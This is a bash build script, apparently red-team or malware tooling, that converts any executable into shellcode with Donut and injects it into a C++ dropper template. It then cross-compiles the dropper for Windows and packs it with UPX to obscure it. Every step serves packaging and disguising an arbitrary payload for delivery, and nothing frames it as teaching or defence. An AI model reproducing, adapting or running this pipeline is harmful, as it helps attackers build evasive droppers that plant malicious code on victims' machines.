#!/bin/bash

# Everything here gets run inside the container

if [ $# -eq 0 ]; then
    echo "Usage: ./bubblewrap.sh <executable>"
    exit 0
fi

# generate shellcode
/opt/donut/donut -a 2 -f 3 /root/bubblewrap/$1

# extract the lines containing bytes
tail -n +2 /root/bubblewrap/loader.rb | head -n -1 > loader-trimmed.rb

# get the position of the byte array in the dropper template
INSERT_PAYLOAD_AT_LINE=$(grep -n "unsigned char payload" dropper_base.cpp | cut -d \: -f 1)

# get the length of the shellcode (assumes 16 bytes per line)
let "NUM_BYTES = 16 * $(wc -l loader-trimmed.rb | cut -d ' ' -f 1)"

# insert the shellcode and its length into the dropper template
sed -e "${INSERT_PAYLOAD_AT_LINE}r loader-trimmed.rb" -e "s/payload_len \= 0/payload_len \= ${NUM_BYTES}/g" /root/bubblewrap/dropper_base.cpp > /root/bubblewrap/dropper_mod.cpp

# compile the dropper
x86_64-w64-mingw32-c++ -o /root/bubblewrap/dropper.exe -static-libgcc -static-libstdc++ /root/bubblewrap/dropper_mod.cpp

# pack the dropper
upx --ultra-brute /root/bubblewrap/dropper.exe -o /root/bubblewrap/dropper-packed.exe
